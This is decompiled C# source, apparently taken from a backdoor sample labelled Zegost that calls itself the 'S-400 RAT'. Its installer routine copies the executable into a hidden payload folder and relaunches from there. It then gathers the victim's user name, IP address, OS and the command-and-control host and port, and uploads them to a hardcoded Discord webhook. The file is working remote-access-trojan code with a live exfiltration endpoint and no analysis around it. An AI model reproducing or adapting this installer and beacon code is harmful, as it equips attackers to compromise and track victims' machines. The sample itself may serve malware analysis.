// Decompiled with JetBrains decompiler
// Type: S400.Installing
// Assembly: Client, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E238969-7352-439B-AF4B-F16FB5D78EB5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Zegost.gen-c50b14be52addaac071e25ca25c9249cd97eef4556b93db74f6aba00b8202b8a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

namespace S400
{
  public class Installing
  {
    public static bool Cm(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void INS()
    {
      Thread.Sleep(1000);
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!Installing.Cm(Program.LO, new FileInfo(Interaction.Environ(Functions.Diry) + "\\" + Functions.Folder.ToLower() + "\\" + Functions.payload.ToLower())))
      {
        try
        {
          if (!Directory.Exists(Functions.DIR))
            Directory.CreateDirectory(Functions.DIR);
          if (System.IO.File.Exists(Functions.DIR + "\\" + Functions.payload))
          {
            try
            {
              System.IO.File.Delete(Functions.DIR + "\\" + Functions.payload);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          FileStream fileStream = new FileStream(Functions.DIR + "\\" + Functions.payload, FileMode.CreateNew);
          byte[] array = System.IO.File.ReadAllBytes(Program.LO.FullName);
          fileStream.Write(array, 0, array.Length);
          fileStream.Flush();
          fileStream.Close();
          Program.LO = new FileInfo(Functions.DIR + "\\" + Functions.payload);
          Process.Start(Program.LO.FullName);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        string str1 = Program.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
        string str2 = new IPAddress(Dns.GetHostByName(Dns.GetHostName()).AddressList[0].Address).ToString();
        string str3 = "https://discord.com/api/webhooks/885057155022090271/Y6c_ufVqXckwmwR_cy3gGy8OpbuveZuABdqBZCQWHS12Ta7OBnNvLgE3eQEw4fzi8tQn";
        object obj = (object) new WebClient();
        object Instance1 = (object) new NameValueCollection();
        NewLateBinding.LateIndexSet(Instance1, new object[2]
        {
          (object) "content",
          (object) ("S-400 RAT :----> You have a running computer...\r\ninformation ------------------------------\r\n[+]Name : " + Environment.UserName + "\r\n[+]  IP : " + str2 + "\r\n[+] Os : " + str1 + "\r\n[+] Host : " + Program.hh + "\r\n[+] Port : " + Program.pp + "\r\nEnd ...")
        }, (string[]) null);
        object Instance2 = obj;
        object[] objArray = new object[2]
        {
          (object) str3,
          RuntimeHelpers.GetObjectValue(Instance1)
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[2]{ true, true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(Instance2, (Type) null, "UploadValues", Arguments, (string[]) null, (Type[]) null, CopyBack, true);
        if (flagArray[0])
        {
          string str4 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        }
        if (flagArray[1])
          RuntimeHelpers.GetObjectValue(objArray[1]);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
